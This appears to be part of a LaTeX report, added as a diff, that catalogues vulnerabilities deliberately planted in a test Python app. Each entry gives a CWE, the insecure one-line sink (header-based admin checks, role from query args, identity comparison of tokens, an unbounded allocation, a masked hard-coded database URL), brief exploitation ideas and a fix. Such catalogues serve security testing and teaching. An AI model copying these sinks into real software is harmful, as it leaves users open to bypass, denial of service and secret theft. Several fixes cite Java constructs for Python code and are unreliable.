+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Repeat the operation to exhaust file handles/connections (DoS).
+\end{itemize}
+\noindent\textbf{Remediation.} Use try-with-resources / finally to always close.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-85: CWE-789: Uncontrolled Memory Allocation}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 49 \quad \textbf{Rule:} \texttt{python/uncontrolled-memory-allocation} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/789.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return [0] * n
+\end{lstlisting}
+\noindent\textbf{What it is.} Uncontrolled memory allocation driven by input size.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Send a huge size/count so the app allocates until OOM (DoS).
+\end{itemize}
+\noindent\textbf{Remediation.} Cap sizes; validate length/count before allocating.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-86: CWE-190: Integer Overflow or Wraparound}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 56 \quad \textbf{Rule:} \texttt{python/integer-overflow} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/190.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return bytearray(width * height)
+\end{lstlisting}
+\noindent\textbf{What it is.} Integer overflow/wraparound produces an unexpected small/negative value.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Provide values near MAX\_INT so arithmetic wraps, bypassing size/bounds checks.
+\item Trigger under-allocation followed by out-of-bounds write, or negative loop counters.
+\end{itemize}
+\noindent\textbf{Remediation.} Use checked arithmetic (Math.addExact), validate ranges, use wider/big-integer types.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-87: CWE-835: Loop With Unreachable Exit Condition}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 62 \quad \textbf{Rule:} \texttt{python/infinite-loop} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/835.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+while n != 0:
+\end{lstlisting}
+\noindent\textbf{What it is.} Loop whose exit condition can never be met (infinite loop).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Provide input that hits the non-terminating path to hang a thread (DoS).
+\end{itemize}
+\noindent\textbf{Remediation.} Ensure loop bounds/termination for all inputs; add timeouts.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-88: CWE-369: Divide By Zero}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 70 \quad \textbf{Rule:} \texttt{python/divide-by-zero} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/369.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return 100 / divisor
+\end{lstlisting}
+\noindent\textbf{What it is.} Divide-by-zero from unvalidated operands.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Send a zero divisor to throw ArithmeticException and crash the request/thread (DoS).
+\end{itemize}
+\noindent\textbf{Remediation.} Validate the divisor before dividing.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-89: CWE-476: NULL Pointer Dereference}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 76 \quad \textbf{Rule:} \texttt{python/null-pointer-dereference} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/476.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return value.strip()
+\end{lstlisting}
+\noindent\textbf{What it is.} Null pointer dereference from unchecked null.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Provide input that yields null (missing param/lookup miss) to crash the thread (DoS).
+\end{itemize}
+\noindent\textbf{Remediation.} Null-check and use Optional; fail gracefully.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-90: CWE-617: Reachable Assertion}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 82 \quad \textbf{Rule:} \texttt{python/reachable-assertion} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/617.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+assert is_admin, "forbidden"
+\end{lstlisting}
+\noindent\textbf{What it is.} Reachable assertion: user input can trigger an assertion/abort.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Send input that fails an assert to crash the process/thread (DoS).
+\end{itemize}
+\noindent\textbf{Remediation.} Handle invalid input with normal error handling, not asserts, in production.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-91: CWE-597: Use of Wrong Operator in String Comparison}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 88 \quad \textbf{Rule:} \texttt{python/use-of-wrong-operator-in-string-comparison} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/597.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return token is expected
+\end{lstlisting}
+\noindent\textbf{What it is.} Wrong operator (== instead of .equals) for String/object comparison.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Comparison may fail/succeed based on reference identity, bypassing intended checks (e.g. token compare).
+\end{itemize}
+\noindent\textbf{Remediation.} Use .equals()/constant-time compare for value equality.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-92: CWE-798: Use of Hard-coded Credentials}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 93 \quad \textbf{Rule:} \texttt{python/use-of-hard-coded-credentials} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/798.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return "postgres://***@10.0.0.5:5432/prod"
+\end{lstlisting}
+\noindent\textbf{What it is.} Hard-coded credentials (keys/tokens/passwords) in source.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Extract the secret from the repo/binary and use it directly.
+\end{itemize}
+\noindent\textbf{Remediation.} Externalize secrets to a vault/env; rotate leaked ones.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-93: CWE-548: Information Exposure Through Directory Listing}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 98 \quad \textbf{Rule:} \texttt{python/information-exposure-through-directory-listing} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/548.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+app.config["EXPLORER_ENABLE_DIRECTORY_LISTING"] = True
+\end{lstlisting}
+\noindent\textbf{What it is.} Directory listing exposes files that should be hidden.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Browse the listing to discover backups, sources, configs, and enumerate the app.
+\end{itemize}
+\noindent\textbf{Remediation.} Disable auto-indexing; return 404 for directories.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-94: CWE-200: Exposure of Sensitive Information}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 104 \quad \textbf{Rule:} \texttt{python/information-exposure} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/200.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+resp.headers["Server"] = "Werkzeug/2.0.1 Python/3.9.2 app-build-1234"
+\end{lstlisting}
+\noindent\textbf{What it is.} Sensitive information is exposed to an unauthorized actor.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Read leaked data (paths, versions, internal IPs, PII) from responses/errors.
+\item Use disclosed details to plan a targeted follow-up attack.
+\end{itemize}
+\noindent\textbf{Remediation.} Return only what the client needs; suppress internal details in responses.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-95: CWE-501: Trust Boundary Violation}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 110 \quad \textbf{Rule:} \texttt{python/trust-boundary-violation} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/501.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+session["role"] = request.args.get("role")
+\end{lstlisting}
+\noindent\textbf{What it is.} Trust boundary violation: untrusted data placed into a trusted store (e.g. session) unvalidated.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Poison session/trusted context so later trusted reads act on attacker data.
+\end{itemize}
+\noindent\textbf{Remediation.} Validate before crossing into a trusted context.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-96: CWE-345: Insufficient Verification of Data Authenticity}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 116 \quad \textbf{Rule:} \texttt{python/insufficient-verification-of-data-authenticity} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/345.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return payload.decode()
+\end{lstlisting}
+\noindent\textbf{What it is.} Insufficient verification of data authenticity/integrity.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Tamper with data in transit/storage since integrity is not checked.
+\item Forge messages the app accepts as genuine.
+\end{itemize}
+\noindent\textbf{Remediation.} Verify signatures/MACs before trusting data.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-97: CWE-681: Incorrect Numeric Conversion}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 122 \quad \textbf{Rule:} \texttt{python/incorrect-numeric-conversion} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/681.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return int(amount)
+\end{lstlisting}
+\noindent\textbf{What it is.} Incorrect numeric conversion between types loses/changes value.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Provide values that overflow/truncate on cast to bypass a bounds check.
+\end{itemize}
+\noindent\textbf{Remediation.} Validate ranges before/after conversion; use appropriate types.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-98: CWE-602: Client-Side Enforcement of Server-Side Security}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 127 \quad \textbf{Rule:} \texttt{python/client-side-enforcement-of-server-side-security} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/602.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+if request.headers.get("X-Is-Admin") == "true":
+\end{lstlisting}
+\noindent\textbf{What it is.} Server trusts client-side enforced security decisions.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Tamper with hidden fields/JS checks/prices in the request; server accepts them.
+\end{itemize}
+\noindent\textbf{Remediation.} Re-validate and authorize everything on the server.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-99: CWE-478: Missing Default Case in Multiple Condition Expression}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 135 \quad \textbf{Rule:} \texttt{python/missing-default-case} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/478.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+mapping = {"read": {"r"}, "write": {"r", "w"}}
+\end{lstlisting}
+\noindent\textbf{What it is.} Missing/mishandled default branch: a multi-way selection lacks a safe default, so unexpected inputs fall into an unintended (often over-permissive) branch.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Send a value not covered by the explicit cases to hit the permissive fallback (e.g. gain extra permissions).
+\item Combine with weak input validation to reach a privileged code path.
+\end{itemize}
+\noindent\textbf{Remediation.} Provide an explicit, deny-by-default branch; fail closed on unknown inputs.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-100: CWE-598: Information Exposure Through Query Strings}
+\noindent\textbf{Location:} \texttt{src/vulnapp/concurrency\_misc\_vulns.py}, line 143 \quad \textbf{Rule:} \texttt{python/information-exposure-through-query-string} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/598.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+logger.info("Request URL: /data?api_key=" + api_key)
+\end{lstlisting}
+\noindent\textbf{What it is.} Sensitive data sent in the URL query string.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Harvest secrets from browser history, referer headers, proxy/server logs.
+\end{itemize}
+\noindent\textbf{Remediation.} Send sensitive data in the body over TLS, not the URL.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\end{document}
